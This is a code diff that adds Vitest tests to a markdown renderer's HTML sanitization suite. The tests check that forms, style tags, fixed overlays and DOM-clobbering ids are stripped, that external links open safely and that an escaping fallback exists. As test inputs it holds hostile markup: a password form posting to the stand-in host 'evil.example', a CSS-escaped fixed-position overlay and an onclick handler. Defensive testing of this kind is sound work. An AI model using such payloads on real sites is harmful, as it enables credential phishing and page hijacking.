@@ -1,6 +1,6 @@
 // @vitest-environment jsdom
 import { describe, it, expect } from 'vitest';
-import { renderMarkdown } from '../../src/ui/nb-view/renderers/markdown';
+import { renderMarkdown, escapeHtmlFallback } from '../../src/ui/nb-view/renderers/markdown';
 
 describe('Markdown & HTML Output Security (DOMPurify Sanitization)', () => {
   it('strips <script> tags and executes no code', async () => {
@@ -51,5 +51,57 @@ describe('Markdown & HTML Output Security (DOMPurify Sanitization)', () => {
 
     expect(html).toContain('katex');
     expect(html).toContain('math');
+  });
+
+  it('removes forms and form controls', async () => {
+    const html = await renderMarkdown(
+      '<form action="https://evil.example/c"><input type="password" name="p"><button>Go</button></form>'
+    );
+    expect(html).not.toMatch(/<form|<input|<button/);
+  });
+
+  it('strips fixed/absolute/sticky positioning, including CSS escapes', async () => {
+    for (const s of [
+      'position:fixed',
+      'position: absolute',
+      'posit\\69on:fixed',
+      'position:sticky'
+    ]) {
+      const html = await renderMarkdown(`<div style="${s};inset:0">x</div>`);
+      expect(html).not.toMatch(/fixed|absolute|sticky/);
+    }
+  });
+
+  it('keeps relative positioning and KaTeX inline styles', async () => {
+    const html = await renderMarkdown(
+      '$$\\frac{a}{b}$$\n\n<span style="position:relative;top:1px">r</span>'
+    );
+    expect(html).toContain('class="katex');
+    expect(html).toMatch(/style="[^"]*vertical-align/);
+    expect(html).toMatch(/position:\s*relative/);
+  });
+
+  it('drops <style> elements', async () => {
+    expect(await renderMarkdown('<style>body{display:none}</style>ok')).not.toContain('<style');
+  });
+
+  it('opens external links in a new tab safely, leaves anchors alone', async () => {
+    const ext = await renderMarkdown('[d](https://example.com)');
+    expect(ext).toContain('target="_blank"');
+    expect(ext).toContain('rel="noopener noreferrer"');
+    const anchor = await renderMarkdown('[s](#section)');
+    expect(anchor).not.toContain('target=');
+  });
+
+  it('namespaces id/name to prevent DOM clobbering', async () => {
+    const html = await renderMarkdown(
+      '<img id="app" name="settings" src="data:image/png;base64,AA==">'
+    );
+    expect(html).toContain('id="user-content-app"');
+    expect(html).not.toMatch(/\bid="app"/);
+  });
+
+  it('fails closed: escapes html when no sanitizer is available', () => {
+    expect(escapeHtmlFallback('<b onclick=x>t</b>')).toBe('&lt;b onclick=x&gt;t&lt;/b&gt;');
   });
 });
